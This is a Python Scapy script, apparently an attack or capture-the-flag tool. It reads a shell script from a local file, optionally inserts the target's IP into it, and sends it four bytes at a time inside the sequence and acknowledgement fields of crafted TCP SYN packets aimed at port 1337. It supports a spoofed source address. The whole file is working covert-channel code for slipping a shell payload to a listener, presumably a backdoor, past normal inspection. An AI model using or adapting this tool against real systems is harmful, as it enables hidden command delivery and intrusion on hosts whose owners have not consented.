from scapy.all import IP, TCP, sr1, send, RandShort, conf
import sys
import struct
import time

# quiet Scapy output
conf.verb = 0


# ==== CONFIGURE ====
with open(".env") as f:
    DST_IP = f.read().strip()
DST_PORT = 1337
SRC_IP   = None             # None -> let kernel choose / use interface IP (or set to spoofed IP)
SRC_PORT = RandShort()      # random source port
SEQ      = 0x01ab0539       # initial sequence number (optional, can be random)
SEQ_ACK  = 0x69
TIMEOUT  = 5                # seconds to wait for reply

REPLACE_DST_IP = True       # Replace templated '{DST_IP}' in source file
# ===================

def send_data(data, extra=b"\x00", offset=0):

    if SRC_IP:
        ip = IP(dst=DST_IP, src=SRC_IP)
    else:
        ip = IP(dst=DST_IP)

    #seq = b"\x02\x00\x00\x00"

    seq2 = b"".join([b"\x02", extra, struct.pack(">H", offset)])

    seq_int = struct.unpack(">L", seq2)[0]

    data_int = struct.unpack(">L", data)[0]

    tcp = TCP(sport=SRC_PORT, dport=DST_PORT, flags="S", seq=seq_int, ack=data_int,
              options=[('MSS', 1460), ('SAckOK',''), ('Timestamp',(0,0))])

    pkt = ip / tcp

    print(f"Sending SYN -> {DST_IP}:{DST_PORT} (sport {int(SRC_PORT)})")
    send(pkt)   # send and wait for single reply

def main():
    with open("try.sh", "rb") as f:
        data = f.read()
    
    if REPLACE_DST_IP:
        data = data.replace(b"{DST_IP}", DST_IP.encode())

    for i in range(0, len(data), 4):
        if i == 0:
            send_data(data[i:i+4], b"\x20", i)
        elif i == 4:
            send_data(data[i:i+4], b"\x30", i)
        elif i == len(data)-4:
            send_data(data[i:i+4], b"\x10", i)
        else:
            send_data(data[i:i+4], offset=i)
        time.sleep(2)

main()
